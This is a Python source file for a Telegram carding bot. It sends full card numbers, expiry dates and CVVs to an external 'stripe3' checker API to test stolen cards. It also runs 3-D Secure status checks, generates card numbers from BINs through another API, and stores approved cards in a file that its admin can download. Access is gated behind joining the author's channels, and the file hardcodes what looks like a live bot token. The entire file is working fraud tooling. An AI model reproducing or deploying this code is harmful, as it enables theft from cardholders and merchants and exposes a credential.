import os
import json
import requests
import time
import telebot
from telebot import types

# Configuration
TOKEN = "7762496719:AAFh1toLV9IhXqwAclKsGaAjiCm30SHKoAY"
ADMIN_ID = 7666198278.

# Channels configuration
CHANNELS = {
    "main": {
        "name": "Main Channel",
        "url": "https://t.me/darksniperxd",
        "chat_id": "-1002467064706"
    },
    "updates": {
        "name": "Updates Channel",
        "url": "https://t.me/+uslX7dcZ1tY3MGE9",
        "chat_id": "-1002673799451"
    }
}

# API endpoints
CC_API = "https://paypal-1-1bpd.onrender.com/gate=stripe3/keydarkwaslost/cc="
VBV_API = "https://vbv-by-dark-waslost.onrender.com/key=darkwaslost/cc="
GEN_API = "https://drlabapis.onrender.com/api/ccgenerator?bin={}&count=10"
BIN_API = "https://bins.antipublic.cc/bins/"

# File paths
USERS_FILE = "users.txt"
GROUPS_FILE = "groups.txt"
APPROVED_CARDS_FILE = "approved_cards.txt"

bot = telebot.TeleBot(TOKEN)

# Initialize files if they don't exist
for file_path in [USERS_FILE, GROUPS_FILE, APPROVED_CARDS_FILE]:
    if not os.path.exists(file_path):
        with open(file_path, "w") as f:
            pass

def save_user(user_id):
    """Save user ID to users.txt if not already present"""
    with open(USERS_FILE, "r+") as f:
        users = f.read().splitlines()
        if str(user_id) not in users:
            f.write(f"{user_id}\n")

def save_group(chat_id):
    """Save group ID to groups.txt if not already present"""
    with open(GROUPS_FILE, "r+") as f:
        groups = f.read().splitlines()
        if str(chat_id) not in groups:
            f.write(f"{chat_id}\n")

def save_approved_card(card):
    """Save approved card to approved_cards.txt"""
    with open(APPROVED_CARDS_FILE, "a") as f:
        f.write(f"{card}\n")

def check_membership(user_id):
    """Check if user is member of required channels"""
    try:
        for channel in CHANNELS.values():
            member = bot.get_chat_member(chat_id=channel["chat_id"], user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        return True
    except Exception as e:
        print(f"Error checking membership: {e}")
        return False

def get_bin_info(bin):
    """Get BIN information from API"""
    try:
        response = requests.get(f"{BIN_API}{bin}")
        if response.status_code == 200:
            return response.json()
        return None
    except Exception as e:
        print(f"Error getting BIN info: {e}")
        return None

def format_bin_info(bin_info):
    """Format BIN information for display"""
    if not bin_info:
        return "BIN info not available"
    
    brand = bin_info.get("brand", "Unknown")
    card_type = bin_info.get("type", "Unknown")
    level = bin_info.get("level", "Unknown")
    bank = bin_info.get("bank", "Unknown")
    country = bin_info.get("country_name", "Unknown")
    flag = bin_info.get("country_flag", "")
    
    return f"{brand} - {card_type} - {level}\nIssuer: {bank}\nCountry: {country} {flag}"

@bot.message_handler(commands=['start'])
def start(message):
    """Handle /start command"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if message.chat.type != "private":
        save_group(chat_id)
        return
    
    save_user(user_id)
    
    # Check if user is already verified
    if check_membership(user_id):
        bot.send_message(
            chat_id,
            "✅ You're already verified!\n\n"
            "Available commands:\n"
            "/chk - Check a CC\n"
            "/vbv - VBV Check\n"
            "/gen - Generate CCs\n"
            "/ping - Check bot status"
        )
        return
    
    # Ask to join channels
    keyboard = types.InlineKeyboardMarkup()
    for channel in CHANNELS.values():
        keyboard.add(types.InlineKeyboardButton(
            text=f"Join {channel['name']}",
            url=channel["url"]
        ))
    keyboard.add(types.InlineKeyboardButton(
        text="✅ Verify",
        callback_data="verify"
    ))
    
    bot.send_message(
        chat_id,
        "⚠️ To use this bot, please join our channels first:",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_callback(call):
    """Handle verify button callback"""
    user_id = call.from_user.id
    
    if check_membership(user_id):
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="✅ Verification successful!\n\n"
                 "Available commands:\n"
                 "/chk - Check a CC\n"
                 "/vbv - VBV Check\n"
                 "/gen - Generate CCs\n"
                 "/ping - Check bot status"
        )
    else:
        bot.answer_callback_query(
            call.id,
            "❌ You haven't joined all channels yet!",
            show_alert=True
        )

@bot.message_handler(commands=['chk'])
def check_cc(message):
    """Handle CC checking"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_membership(user_id):
        bot.reply_to(message, "❌ Please join our channels first using /start")
        return
    
    if message.chat.type != "private":
        bot.reply_to(message, "⚠️ Please use this command in private chat with the bot")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /chk CC|MM|YYYY|CVV")
        return
    
    cc = message.text.split(maxsplit=1)[1]
    if "|" not in cc:
        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YYYY|CVV")
        return
    
    # Send initial message
    msg = bot.reply_to(message, "🔄 Checking your card, please wait...")
    
    try:
        # Make API request
        response = requests.get(f"{CC_API}{cc}")
        if response.status_code != 200:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text="❌ Error connecting to API. Please try again later."
            )
            return
        
        data = response.json()
        status = data.get("status", "")
        response_text = data.get("response", "")
        result = data.get("result", "")
        gateway = data.get("gateway", "")
        time_taken = data.get("time", "")
        
        # Get BIN info
        bin = cc.split("|")[0][:6]
        bin_info = get_bin_info(bin)
        
        # Format response
        if "Approved" in status:
            status_text = "Approved ✅"
            save_approved_card(cc)
        else:
            status_text = "Declined ❌"
        
        response_msg = (
            f"{status_text}\n\n"
            f"𝗖𝗮𝗿𝗱: {cc}\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}\n\n"
            f"𝗜𝗻𝗳𝗼: {format_bin_info(bin_info)}\n\n"
            f"𝗧𝗶𝗺𝗲: {time_taken}"
        )
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=response_msg
        )
        
    except Exception as e:
        print(f"Error checking CC: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text="❌ An error occurred. Please try again later."
        )

@bot.message_handler(commands=['vbv'])
def check_vbv(message):
    """Handle VBV checking"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_membership(user_id):
        bot.reply_to(message, "❌ Please join our channels first using /start")
        return
    
    if message.chat.type != "private":
        bot.reply_to(message, "⚠️ Please use this command in private chat with the bot")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /vbv CC|MM|YYYY|CVV")
        return
    
    cc = message.text.split(maxsplit=1)[1]
    if "|" not in cc:
        bot.reply_to(message, "❌ Invalid format. Use: CC|MM|YYYY|CVV")
        return
    
    # Send initial message
    msg = bot.reply_to(message, "🔄 Checking VBV status, please wait...")
    
    try:
        # Make API request
        response = requests.get(f"{VBV_API}{cc}")
        if response.status_code != 200:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text="❌ Error connecting to API. Please try again later."
            )
            return
        
        data = response.json()
        status = data.get("status", "")
        response_text = data.get("response", "")
        gateway = data.get("gateway", "")
        time_taken = data.get("time_taken", "")
        bin_info = data.get("bin_info", {})
        
        # Format response
        if "Rejected" in status:
            status_text = "Rejected ❌"
        else:
            status_text = "Passed ✅"
        
        brand = bin_info.get("brand", "Unknown")
        card_type = bin_info.get("type", "Unknown")
        level = bin_info.get("level", "Unknown")
        bank = bin_info.get("bank", "Unknown")
        country = bin_info.get("country", "Unknown")
        
        response_msg = (
            f"{status_text}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ {cc}\n"
            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⇾ {gateway}\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⇾ {response_text}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {bank}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {country}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {time_taken}"
        )
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=response_msg
        )
        
    except Exception as e:
        print(f"Error checking VBV: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text="❌ An error occurred. Please try again later."
        )

@bot.message_handler(commands=['gen'])
def generate_cc(message):
    """Handle CC generation"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_membership(user_id):
        bot.reply_to(message, "❌ Please join our channels first using /start")
        return
    
    if message.chat.type != "private":
        bot.reply_to(message, "⚠️ Please use this command in private chat with the bot")
        return
    
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /gen BIN\nExample: /gen 412236")
        return
    
    bin = message.text.split(maxsplit=1)[1]
    if len(bin) < 6:
        bot.reply_to(message, "❌ BIN must be at least 6 digits")
        return
    
    # Send initial message
    msg = bot.reply_to(message, "🔄 Generating cards, please wait...")
    
    try:
        # Make API request
        response = requests.get(GEN_API.format(bin))
        if response.status_code != 200:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text="❌ Error connecting to API. Please try again later."
            )
            return
        
        # Get BIN info
        bin_info = get_bin_info(bin)
        
        # Format response
        response_msg = (
            f"𝗕𝗜𝗡 ⇾ {bin}\n"
            f"𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10\n\n"
            f"{response.text}\n\n"
            f"𝗜𝗻𝗳𝗼: {format_bin_info(bin_info)}"
        )
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=response_msg
        )
        
    except Exception as e:
        print(f"Error generating CCs: {e}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text="❌ An error occurred. Please try again later."
        )

@bot.message_handler(commands=['approved'])
def send_approved_cards(message):
    """Send approved cards to admin"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ This command is only for admin")
        return
    
    if not os.path.exists(APPROVED_CARDS_FILE) or os.path.getsize(APPROVED_CARDS_FILE) == 0:
        bot.reply_to(message, "❌ No approved cards found")
        return
    
    with open(APPROVED_CARDS_FILE, "rb") as f:
        bot.send_document(
            chat_id,
            f,
            caption="✅ Approved cards"
        )

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    """Broadcast message to all users and groups"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ This command is only for admin")
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "❌ Please reply to the message you want to broadcast")
        return
    
    # Get all users and groups
    with open(USERS_FILE, "r") as f:
        users = f.read().splitlines()
    
    with open(GROUPS_FILE, "r") as f:
        groups = f.read().splitlines()
    
    total = len(users) + len(groups)
    success = 0
    
    # Send to users
    for user in users:
        try:
            bot.copy_message(
                chat_id=user,
                from_chat_id=chat_id,
                message_id=message.reply_to_message.message_id
            )
            success += 1
        except Exception as e:
            print(f"Error sending to user {user}: {e}")
    
    # Send to groups
    for group in groups:
        try:
            bot.copy_message(
                chat_id=group,
                from_chat_id=chat_id,
                message_id=message.reply_to_message.message_id
            )
            success += 1
        except Exception as e:
            print(f"Error sending to group {group}: {e}")
    
    bot.reply_to(
        message,
        f"📢 Broadcast completed!\n\n"
        f"Total recipients: {total}\n"
        f"Successfully sent: {success}\n"
        f"Failed: {total - success}"
    )

@bot.message_handler(commands=['ping'])
def ping(message):
    """Check bot status"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    start_time = time.time()
    msg = bot.reply_to(message, "🏓 Pong!")
    end_time = time.time()
    
    latency = round((end_time - start_time) * 1000, 2)
    
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=msg.message_id,
        text=f"🏓 Pong!\n\n"
             f"⏳ Latency: {latency}ms\n"
             f"🛠 Status: Operational\n"
             f"🤖 Version: 1.0"
    )

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Save all groups and users"""
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if message.chat.type != "private":
        save_group(chat_id)
    else:
        save_user(user_id)

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()

